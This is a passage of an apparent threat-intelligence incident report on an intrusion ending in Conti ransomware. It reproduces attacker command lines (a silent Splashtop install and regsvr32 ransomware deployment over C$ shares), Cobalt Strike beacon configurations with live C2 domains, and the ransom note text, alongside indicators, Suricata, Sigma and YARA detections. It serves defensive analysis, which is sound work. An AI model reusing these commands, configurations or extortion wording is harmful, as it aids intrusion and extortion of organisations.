48e674a2-3563-48a1-a224-8ce2e9aada26 \"2e346c4a-b87a-443b-b4d8-d899ea8688c3\" agent- | my.splashtop.com       |\n  |                   | \"AgentPackageSTRemote.exe\" 48e674a2-3563-48a1-a224-8ce2e9aada26 \"2e346c4a-b87a-443b-b4d8-d899ea8688c3\" agent- | download.splashtop.com |\n```\n\n```image\nAlt: Splashtop Streamer\nDescription: The image displays a table containing details about network activity related to the use of Splashtop Streamer in a cyber threat intelligence context. It includes columns for 'Computer Name', 'Initiating Process File Name', and 'Process Command Line'. Two entries are shown: one for 'Beachhead' and another for 'Domain Controller', both indicating the use of 'AgentPackageSTRemote.exe' as the initiating process, along with specific command line arguments that detail how the Splashtop Streamer was used to establish remote connections.\nTranscription: |\n  | Computer Name     | Initiating Process File Name | Process Command Line                                                                                                                                                                                                                                                          |\n  | ----------------- | ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | Beachhead         | AgentPackageSTRemote.exe     | \"SRUtility.exe\" -a \"st-streamer://com.splashtop.streamer/?rmm_code=hZCDFPhK75mJ\" \"SRUtility.exe\" -a \"st-streamer://com.splashtop.streamer/?rmm_session_pwd=f8154387506a04e293954372a28e366b\" \"SplashtopStreamer3360.exe\" prevercheck /s /i sec_opt=0,confirm_d=0,hidewindow=1 |\n  | Domain Controller | AgentPackageSTRemote.exe     | \"SRUtility.exe\" -a \"st-streamer://com.splashtop.streamer/?rmm_code=hZCDFPhK75mJ\" \"SRUtility.exe\" -a \"st-streamer://com.splashtop.streamer/?rmm_session_pwd=4eaec1d030f49d48001e131a10f801c1\" \"SplashtopStreamer3360.exe\" prevercheck /s /i sec_opt=0,confirm_d=0,hidewindow=1 |\n```\n\nSplashtop Streamer usage leaves many network connections to *.api.splashtop.com and *.relay.splashtop.com on port 443:\n\n```image\nAlt: Splashtop Connections\nDescription: The image is a network diagram showing connections to various Splashtop relay servers from a central point labeled \"SRManager.exe.\" It displays multiple IP addresses associated with relay.splashtop.com, visually illustrating the connections and flow of data between these servers and the SRManager process. The diagram highlights the extent of the communication with the Splashtop service, indicating potential paths of remote access used by threat actors.\nTranscription: |\n  \"SRManager.exe\"\n      ├── 54-185-153-29.relay.splashtop.com\n      ├── 129-146-44-44.relay.splashtop.com\n      ├── 129-146-110-111.relay.splashtop.com\n      ├── 35-212-250-230.relay.splashtop.com\n      ├── 129-146-178-19.relay.splashtop.com\n      ├── 152-70-151-144.relay.splashtop.com\n      ├── st-v3-univ-srs-win-3484-g3.api.splashtop.com\n      ├── 152-70-137-190.relay.splashtop.com\n      ├── 54-245-159-230.relay.splashtop.com\n      ├── 129-146-60-216.relay.splashtop.com\n      ├── 132-226-26-231.relay.splashtop.com\n      ├── 35-212-219-253.relay.splashtop.com\n      ├── 129-146-104-247.relay.splashtop.com\n      ├── 129-146-166-188.relay.splashtop.com\n      ├── 53-52-245-62.relay.splashtop.com\n      ├── 129-146-179-153.relay.splashtop.com\n      ├── 35-215-102-184.relay.splashtop.com\n      ├── 129-146-179-126.relay.splashtop.com\n      ├── 129-146-123-170.relay.splashtop.com\n      ├── 129-146-110-88.relay.splashtop.com\n      ├── 129-146-62-33.relay.splashtop.com\n      ├── s.v.symcb.com\n      ├── 129-146-74-225.relay.splashtop.com\n      ├── 129-146-197-145.relay.splashtop.com\n      ├── 158-101-29-18.relay.splashtop.com\n      ├── 129-146-70-251.relay.splashtop.com\n      ├── 129-146-108-138.relay.splashtop.com\n      ├── 129-146-164-49.relay.splashtop.com\n      ├── 152-70-130-227.relay.splashtop.com\n      ├── 35-215-90-140.relay.splashtop.com\n      ├── 129-146-168-90.relay.splashtop.com\n      ├── 54-67-176-126.relay.splashtop.com\n      ├── 35-212-225-149.relay.splashtop.com\n      ├── 129-146-249-100.relay.splashtop.com\n      ├── 54-218-114-207.relay.splashtop.com\n      ├── st-relay.v3-univ-srs-win-3484-g3.api.splashtop.com\n      ├── s2.symcb.com\n      ├── 129-146-174-231.relay.splashtop.com\n      └── 129-146-67-93.relay.splashtop.com\n```\n\n### Cobalt Strike\n\nWe observed a default Cobalt Strike malleable C2 profile, using the jquery agent string. This activity can be detected with relative ease by the ET rules.\n\n```image\nAlt: Cobalt Strike Profile\nDescription: The image displays a series of HTTP request logs from a server (shytur.com) that include various POST and GET requests to specific jQuery minified JavaScript files. Each entry shows the IP address (179.43.176.93), the HTTP method (either POST or GET), and the endpoint being accessed (e.g., /jquery-3.3.2.min.js). The requests also include query parameters that seem to be related to a Cloudflare device ID, which indicates that these requests might be part of an automated process or exploit.\nTranscription: |\n  179.43.176.93  80  POST  shytur.com  /jquery-3.3.2.min.js?_cfduid=KZeFqH1lsHcp7dxHac\n  179.43.176.93  80  POST  shytur.com  /jquery-3.3.2.min.js?_cfduid=26Esc5dtYbNW7Wh1Y\n  179.43.176.93  80  GET   shytur.com  /jquery-3.3.2.min.js?_cfduid=9–5P87JgQ_Cyo0Gww\n  179.43.176.93  80  POST  shytur.com  /jquery-3.3.2.min.js?_cfduid=Cwv60T7JAN9zw5wPA\n```\n\nThere appeared to be no jitter configured, resulting in a constant stream of HTTP requests, and if using ET rules, constant alerts would be generated.\n\n```image\nAlt: Cobalt Strike Alerts\nDescription: The image displays a series of timestamps, each followed by the word 'alert' in red text. This suggests a log of alerts generated over time, likely related to detected activities from the Cobalt Strike malware as mentioned in the CTI context.\nTranscription: |\n  2021-12-27T23:45:21.187 alert\n  2021-12-27T23:40:06.862 alert\n  2021-12-27T23:40:06.334 alert\n  2021-12-27T23:40:05.536 alert\n  2021-12-27T23:40:05.304 alert\n  2021-12-27T23:40:04.623 alert\n  2021-12-27T23:40:04.030 alert\n  2021-12-27T23:40:03.794 alert\n  2021-12-27T23:40:03.713 alert\n```\n\nJust based on the ET Cobalt Strike rule, ‘ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response’, there were in excess of 6K alerts generated.\n\nDue to the length of this intrusion, we observed the threat actors handing off between C2 servers. We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.\n\n```image\nAlt: C2 Servers\nDescription: The image is a graph displaying the count of events related to various domains over time, specifically for Cobalt Strike activities. Different colors represent different domains: 'bunced.net' in green, 'wayeyoy.com' in blue, 'cirite.com' in purple, 'shytur.com' in red, and another instance of 'shytur.com' in a different shade. The y-axis indicates the count of events, while the x-axis represents time, arranged in 12-hour intervals. The peaks and valleys of the graph illustrate fluctuations in activity, suggesting varying levels of network traffic or alerts generated by these domains.\nTranscription: |\n  {\n    \"bunced.net\": {\n      \"ip\": \"103.208.86.7\",\n      \"count\": 25000\n    },\n    \"wayeyoy.com\": {\n      \"ip\": \"172.241.29.192\",\n      \"count\": 15000\n    },\n    \"cirite.com\": {\n      \"ip\": \"23.81.246.30\",\n      \"count\": 10000\n    },\n    \"shytur.com\": {\n      \"ip\": \"216.73.159.33\",\n      \"count\": 5000\n    }\n  }\n```\n\nIcedID:\n\n```\nguguchrome.com\n5.181.80.214:80\n```\n\n```\napplesflying.com\n5.181.80.113:443\nJa3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ec74a5c51106f0419184d0dd08fb05bc\nCertificate: [89:ac:17:b1:f1:b6:9e:c8:bb:e5:f3:59:ac:e4:91:b2:91:f4:85:58 ]\nNot Before: 2021/12/08 20:30:05 UTC\nNot After: 2022/12/08 20:30:05 UTC\nIssuer Org: Internet Widgits Pty Ltd\nSubject Common: localhost\nSubject Org: Internet Widgits Pty Ltd\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike:\n\n```\nbunced.net\n103.208.86.7:80\n103.208.86.7:443\nJa3: 0eecb7b1551fba4ec03851810d31743f\nJA3s:10b29985cd0ecd878ac083f059c42d51\nCertificate: [8f:98:c5:f8:48:96:b6:cd:13:91:7c:4c:32:85:db:b7:e5:e1:bc:8f ]\nNot Before: 2021/12/09 10:32:43 UTC\nNot After: 2022/03/09 10:32:42 UTC\nIssuer Org: Let's Encrypt\nSubject Common: bunced.net\nPublic Algorithm: id-ec\nPublicKey Curve: secp384r1\n```\n\n```\n{\n  \"x64\": {\n    \"sha256\": \"01a4c5ef0410b379fa83ac1a4132ba6f7b5814192dbdb87e9d7370e6256ea528\",\n    \"md5\": \"21242d958caf225f76ad71a4d3a6d4d9\",\n    \"config\": {\n      \"Jitter\": 10,\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Port\": 80,\n      \"Watermark\": 0,\n      \"C2 Host Header\": \"\",\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"C2 Server\": \"bunced.net,/jquery-3.3.1.min.js\",\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 5000\n    },\n    \"time\": 1639100549541.8,\n    \"sha1\": \"04bbd0ffa580dd5a85ce4c7fc19c66cc753e45ff\",\n    \"uri_queried\": \"/uKVG\"\n  },\n  \"x86\": {\n    \"sha256\": \"9c01afed2a863fa2466679ef53127e925963cc95de98bc4c59cb4743ccc73bf5\",\n    \"md5\": \"e7df03bc59b478f0588039416b845c7f\",\n    \"config\": {\n      \"Jitter\": 10,\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Port\": 80,\n      \"Watermark\": 0,\n      \"C2 Host Header\": \"\",\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"C2 Server\": \"bunced.net,/jquery-3.3.1.min.js\",\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 5000\n    },\n    \"time\": 1639100538593.3,\n    \"sha1\": \"18ddb5fac720599983791036e43154a9ce67ffde\",\n    \"uri_queried\": \"/Uq4b\"\n  }\n}\n```\n\n```\nshytur.com\n179.43.176.93:80\n216.73.159.33:80\n179.43.176.80:80\n```\n\n```\n{\n  \"x64\": {\n    \"config\": {\n      \"Port\": 80,\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Polling\": 5000,\n      \"Method 2\": \"POST\",\n      \"C2 Server\": \"shytur.com,/jquery-3.3.1.min.js\",\n      \"C2 Host Header\": \"\",\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"Watermark\": 0,\n      \"Jitter\": 10,\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\"\n    },\n    \"uri_queried\": \"/RnJS\",\n    \"md5\": \"22bbd14a893b19220e829940ad474687\",\n    \"sha256\": \"10084d7146462d06c599bd14664d14c511b40687e21983e6f8bded06982931a9\",\n    \"sha1\": \"06ef512d5a2b9353b6d0a412a1876e02d3474527\",\n    \"time\": 1640639559417.7\n  },\n  \"x86\": {\n    \"config\": {\n      \"Port\": 80,\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Polling\": 5000,\n      \"Method 2\": \"POST\",\n      \"C2 Server\": \"shytur.com,/jquery-3.3.1.min.js\",\n      \"C2 Host Header\": \"\",\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"Watermark\": 0,\n      \"Jitter\": 10,\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\"\n    },\n    \"uri_queried\": \"/COPz\",\n    \"md5\": \"a48fbea91a31afaf348f713b1f59dfbf\",\n    \"sha256\": \"d281caef6c8fc45d8725d6cd1542234aea35b97b99bb6aaff7688d91a10716f0\",\n    \"sha1\": \"7d700ad69d2800de159af5f50bbb82e89467d8b4\",\n    \"time\": 1640639554775.3\n  }\n}\n```\n\n```\ncirite.com\n23.81.246.30\nJa3: a0e9f5d64349fb13191bc781f81f42e1\nJa3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [f1:43:f2:43:29:79:35:ad:b5:60:c7:79:3a:0f:c6:68:a3:f2:d5:d1 ]\nNot Before: 2021/10/22 00:00:00 UTC\nNot After: 2022/10/22 23:59:59 UTC\nIssuer Org: Sectigo Limited\nSubject Common: cirite.com [cirite.com ,www.cirite.com]\nPublic Algorithm: rsaEncryption\n```\n\n```\n{\n  \"beacontype\": [\n    \"HTTPS\"\n  ],\n  \"sleeptime\": 5000,\n  \"jitter\": 20,\n  \"maxgetsize\": 1864736,\n  \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n  \"license_id\": 0,\n  \"cfg_caution\": false,\n  \"kill_date\": null,\n  \"server\": {\n    \"hostname\": \"cirite.com\",\n    \"port\": 443,\n    \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCNZaG28qpSpw7xhHStBrU+s2eWiOIBlBERsSzWagdI1TzzJHc/EvkkAx3p2NrSkmd3/CoHejTabftxOT7DmjsfLSTOJJy7CETGzCN/Yu3Y+5gYapIgy9h96hXVJJkrU2dFPXAvdWBeYq/5B8wR07jWusXvvb5STypVWiPfKVcrkQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\"\n  },\n  \"host_header\": \"\",\n  \"useragent_header\": null,\n  \"http-get\": {\n    \"uri\": \"/posting\",\n    \"verb\": \"GET\",\n    \"client\": {\n      \"headers\": null,\n      \"metadata\": null\n    },\n    \"server\": {\n      \"output\": [\n        \"print\",\n        \"prepend 600 characters\",\n        \"base64\",\n        \"base64url\"\n      ]\n    }\n  },\n  \"http-post\": {\n    \"uri\": \"/extension\",\n    \"verb\": \"POST\",\n    \"client\": {\n      \"headers\": null,\n      \"id\": null,\n      \"output\": null\n    }\n  },\n  \"tcp_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"crypto_scheme\": 0,\n  \"proxy\": {\n    \"type\": null,\n    \"username\": null,\n    \"password\": null,\n    \"behavior\": \"Use IE settings\"\n  },\n  \"http_post_chunk\": 0,\n  \"uses_cookies\": true,\n  \"post-ex\": {\n    \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n    \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\"\n  },\n  \"process-inject\": {\n    \"allocator\": \"VirtualAllocEx\",\n    \"execute\": [\n      \"CreateThread\",\n      \"CreateRemoteThread\",\n      \"RtlCreateUserThread\"\n    ],\n    \"min_alloc\": 23886,\n    \"startrwx\": false,\n    \"stub\": \"Ms1B7fCBDFtfSY7fRzHMbQ==\",\n    \"transform-x86\": [\n      \"prepend '\\\\x90\\\\x90\\\\x90'\"\n    ],\n    \"transform-x64\": [\n      \"prepend '\\\\x90\\\\x90\\\\x90'\"\n    ],\n    \"userwx\": false\n  },\n  \"dns-beacon\": {\n    \"dns_idle\": null,\n    \"dns_sleep\": null,\n    \"maxdns\": null,\n    \"beacon\": null,\n    \"get_A\": null,\n    \"get_AAAA\": null,\n    \"get_TXT\": null,\n    \"put_metadata\": null,\n    \"put_output\": null\n  },\n  \"pipename\": null,\n  \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"stage\": {\n    \"cleanup\": true\n  },\n  \"ssh\": {\n    \"hostname\": null,\n    \"port\": null,\n    \"username\": null,\n    \"password\": null,\n    \"privatekey\": null\n  }\n}\n```\n\n```\nwayeyoy.com\n172.241.29.192:443\nCertificate: [00:e7:34:3a:ad:bc:61:59:16:5e:d4:2b:e7:64:fa:8c:d5:42:40:17]\nNot Before: 2021/12/07 00:00:00 UTC\nNot After: 2022/12/07 23:59:59 UTC\nIssuer Org: Sectigo Limited\nSubject Common: wayeyoy.com [wayeyoy.com ,www.wayeyoy.com]\nPublic Algorithm: rsaEncryption\n```\n\nA configuration was not obtained for this server.\n\n## Exfiltration\n\nWe did not observe any exfiltration indicators while analyzing host and network forensic artifacts.\n\nThis does not mean that there was no exfiltration, as this could have been performed via Cobalt Strike beacons over encrypted channels.\n\n## Impact\n\nOn the 19th day of the intrusion, the threat actors prepared for their final objectives. From the beachhead host, the directory listings of the domain controllers were checked again, followed by the backup server. On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload. From that host however the attempt failed.\n\nThe threat actors then proceeded to look for other elevation paths. After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers. Once they established this access, around twenty minutes later, they again attempted the ransomware deployment and this time the payload executed properly and began spreading across the network via SMB.\n\nThe threat actors deployed ransomware payload in a DLL, named x64.dll, which was executed using backup.bat batch script.\n\n```image\nAlt: Ransomware Deployment\nDescription: The image displays a table summarizing various actions taken during a ransomware attack. It includes columns for 'Action Type', 'Initiating Process Command Line', and 'File Name'. The actions recorded show instances of file creation and process creation, specifically detailing the execution of a command line script 'backup.bat' and the subsequent creation of a DLL file named 'x64.dll'. This data is likely part of a log from a system monitoring tool, providing insights into the activities linked to the ransomware deployment.\nTranscription: |\n  | Action Type    | Initiating Process Command Line                                              | Process Command Line            | File Name  |\n  | -------------- | ---------------------------------------------------------------------------- | ------------------------------- | ---------- |\n  | FileCreated    | svchost.exe -k UnistackSvcGroup -s CDPUserSvc                                | cmd.exe /C backup.bat           | backup.bat |\n  | ProcessCreated | svchost.exe -k UnistackSvcGroup -s CDPUserSvc                                | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | conhost.exe 0xffffffff -ForceV1 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n```\n\nThis x64.dll DLL contains fingerprints, “conti_v3.dll”, seen in our previous cases:\n\n```image\nAlt: Conti DLL\nDescription: The image displays a snippet of disassembled code related to the Conti ransomware, specifically showing the export ordinals table for the 'conti_v3.dll'. It includes variable declarations such as 'aConti_v3_dll', 'aDllInstall', and 'aDllRegisterServer', indicating functions or data that are exported by the DLL. This technical representation serves to provide insight into the internal workings of the malware, relevant for cybersecurity analysis.\nTranscription: |\n  ; Export Ordinals Table for conti_v3.dll\n  ;\n  .rdata:00000001800323C0\n  word_1800323C0 dw 1, 0, 2\n  .rdata:00000001800323C6\n  aConti_v3_dll db 'conti_v3.dll',0\n  aDllInstall db 'DllInstall',0\n  aDllRegisterServer db 'DllRegisterServer',0\n```\n\nWe didn’t dig into reversing this DLL, as a detailed step-by-step analysis already exists, and gives an excellent explanation of command line parameters used during the execution of Conti ransomware.\n\nOnce the threat actors pushed the encryptor to C$, an excessive SMB network activity were generated in a short period of time (~7K) as indicated by the chart.\n\n```image\nAlt: SMB Activity\nDescription: The image displays a line graph illustrating SMB network activity over a specific time frame. The x-axis represents the dates in December, while the y-axis indicates the volume of SMB activity. A significant spike is observed on December 19, suggesting a surge in network activity during the ransomware deployment, consistent with the details provided in the accompanying text regarding the execution of the ransomware payload.\nTranscription: |\n  | Date   | SMB Activity |\n  | ------ | ------------ |\n  | Mon 13 | 0            |\n  | Wed 15 | 0            |\n  | Fri 17 | 0            |\n  | Sat 19 | 0            |\n  | Tue 21 | 0            |\n  | Thu 23 | 0            |\n  | Sat 25 | 0            |\n  | Mon 27 | 0            |\n  | Wed 29 | 0            |\n  | Fri 31 | 0            |\n  | 2022   | 243          |\n```\n\nThis resulted in files being encrypted and a ‘readme.txt’ ransom note generated on the hosts:\n\n```image\nAlt: Ransom Note\nDescription: The image displays a list of file paths from a system, specifically focusing on instances of 'readme.txt'. The paths indicate that the files are located within various directories under 'AppData\\Local\\Microsoft\\OneDrive\\'. The repetition of 'readme.txt' suggests that this file may be generated by ransomware, such as Conti, as part of its encryption process, hinting at the locations where ransom notes might be found on infected systems.\nTranscription: |\n  AppData\\Local\\Microsoft\\OneDrive\\setup\\logs\\readme.txt           1,183\n  AppData\\Local\\Microsoft\\OneDrive\\setup\\logs\\readme.txt           1,183\n  AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\readme.txt    1,183\n  AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\readme.txt    1,183\n  AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal\\readme.txt        1,183\n  AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\readme.txt          1,183\n  AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\readme.txt          1,183\n```\n\nThe ransom note has slightly been modified from our last Conti cases:\n\n```image\nAlt: Ransom Note\nDescription: The image depicts a ransom note displayed in a Notepad window, indicating that all files on the victim's system are encrypted by the CONTI ransomware strain. The note contains instructions for the victim, including a warning against using recovery software, a suggestion to contact the attackers for further instructions, and a link to a TOR website. Additionally, it mentions that the attackers will decrypt two random files for free as a demonstration of their service. The note includes sections for an identification ID and emphasizes the consequences of ignoring the ransom demand.\nTranscription: |\n  All of your files are currently encrypted by CONTI strain.\n  \n  As you know (if you don't - just \"google it\"), all of the data that has been encrypted by our software cannot be recovered by any means without contacting our team directly.\n  If you try to use any additional recovery software - the files might be damaged, so if you are willing to try - try it on the data of the lowest value.\n  \n  To make sure that we REALLY CAN get your data back - we offer you to decrypt 2 random files completely free of charge.\n  \n  You can contact our team directly for further instructions through our website:\n  \n  TOR VERSION:\n  (you should download and install TOR browser first https://torproject.org)\n  \n  http://conti[REDACTED]cziBa8Qr4\n  \n  YOU SHOULD BE AWARE!\n  Just in case, if you try to ignore us. We've downloaded a pack of your internal data and are ready to publish it on out news website if you do not respond. So it will be better for both sides if you contact us as soon as possible.\n  \n  ---BEGIN ID---\n  [REDACTED]\n  ---END ID---\n```\n\n## Indicators\n\n### Network\n\n```\nEmail Addresses used for Atera Registration:\nmarsmors1947@gmail.com\nhughess6623@outlook.com\n\n5.181.80.214:80\nguguchrome.com\n\n5.181.80.113:443\napplesflying.com\n\n103.208.86.7:80\nbunced.net\n\n172.241.29.192:443\nwayeyoy.com\n\n23.81.246.30:443\ncirite.com\n\n216.73.159.33:80\nshytur.com\n```\n\n### File\n\n```\ndata.dll\n71c8eb081c33fd6b2c10effa92154a18\n8222ed4fcac2c7408e7fbb748af1752e72bb9b01\nbaeb13eea3a71cfaba9d20ef373dcea69cf31f2ec21f45b83f29f699330cb3e3\n\nFaicuy4.exe\nfe4fb0b3ca2cb379d74cd239e71af44f\n6ccd04b109a5148a04ae3ac7f6bc061ccab2122f\na79f5ce304707a268b335f63d15e2d7d740b4d09b6e7d095d7d08235360e739c\n\nEwge.dll/Ijucko32.dll\nb3053228b51ae7af99e0abfa663368d5\n670d974d936262c1c569442238d953ed009f7c79\n4d62929aa9e76694a62b46bc05425452f26e1e9b09ea6f294850ace825229966\n\nEdebef4.dll\n7375eccff18bef7e89665d1a7f31edca\na0836d54aa2a783fd8bae685a1b94e913b655430\n50d2a2564541887570cf784c677de6900aa503648c510927e08c32b5a6ae3bf5\n\nx64.dll\n28bd01b6b3efa726bf00d633398c5c8a\n11012f0074e37e105c404a2eda61f9d652b8c03d\n8fb035b73bf207243c9b29d96e435ce11eb9810a0f4fdcc6bb25a14a0ec8\n```\n\n## Detections\n\n### Suricata\n\n```\nET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response\nET MALWARE Cobalt Strike Beacon Activity (GET)\nETPRO POLICY Observed Atera Remote Access Application Activity Domain in TLS SNI\nET POLICY Command Shell Activity Over SMB - Possible Lateral Movement\nET POLICY SMB Executable File Transfer\nET POLICY SMB2 NT Create AndX Request For an Executable File\nET HUNTING Possible Powershell .ps1 Script Use Over SMB\nET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File\n```\n\n### Sigma\n\n- LSASS Memory Dump\n- PowerView Malicious Commandlets\n- AdFind Discovery\n- Disable Defender\n- Admin Share Access\n- Atera RMM Agent Install\n- Trust Discovery\n- Recon Activity\n- Cobalt Strike Service Installs\n\n```\ntitle: CHCP CodePage Locale Lookup\nstatus: Experimental\ndescription: Detects use of chcp to look up the system locale value as part of host discovery\nauthor: _pete_0, TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n  - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/chcp\ndate: 2022/02/21\nmodified: 2022/02/21\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n      - '\\chcp.com'\n    CommandLine|endswith:\n      - 'chcp'\n    ParentImage|endswith:\n      - '\\cmd.exe'\n    ParentCommandLine|contains:\n      - '/c'\n  condition: selection\nfields:\n  - CommandLine\n  - ParentCommandLine\nfalsepositives:\n  - Unknown\nlevel: high\ntags:\n  - attack.discovery\n  - attack.t1614.001\n```\n\n## YARA\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2022-04-04\n   Identifier: 9438 conti\n   Reference: https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nrule cs_exe_9438 {\n   meta:\n      description = \"9438 - file Faicuy4.exe\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\"\n      date = \"2022-04-04\"\n      hash1 = \"a79f5ce304707a268b335f63d15e2d7d740b4d09b6e7d095d7d08235360e739c\"\n   strings:\n      $x1 = \"C:\\\\Users\\\\Administrator\\\\Documents\\\\Visual Studio 2008\\\\Projects\\\\MUTEXES\\\\x64\\\\Release\\\\MUTEXES.pdb\" fullword ascii\n      $s2 = \"mutexes Version 1.0\" fullword wide\n      $s3 = \"        <requestedExecutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"/><requestedExecutionLevel>\" fullword ascii\n      $s4 = \".?AVCMutexesApp@@\" fullword ascii\n      $s5 = \".?AVCMutexesDlg@@\" fullword ascii\n      $s6 = \"About mutexes\" fullword wide\n      $s7 = \"Mutexes Sample\" fullword wide\n      $s8 = \" 1992 - 2001 Microsoft Corporation.  All rights reserved.\" fullword wide\n      $s9 = \"&Process priority class:\" fullword wide\n      $s10 = \" Type Descriptor'\" fullword ascii\n      $s11 = \"&About mutexes...\" fullword wide\n      $s12 = \" constructor or from DllMain.\" fullword ascii\n      $s13 = \".?AVCDisplayThread@@\" fullword ascii\n      $s14 = \"IsQ:\\\"P\" fullword ascii\n      $s15 = \"CExampleThread\" fullword ascii\n      $s16 = \".?AVCCounterThread@@\" fullword ascii\n      $s17 = \".?AVCExampleThread@@\" fullword ascii\n      $s18 = \"  <trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\">\" fullword ascii\n      $s19 = \"CDisplayThread\" fullword ascii\n      $s20 = \"CCounterThread\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 2000KB and\n      1 of ($x*) and 4 of them\n}\n\nrule conti_dll_9438 {\n   meta:\n      description = \"9438 - file x64.dll\"\n      author = \"TheDFIRReport\"\n      reference = 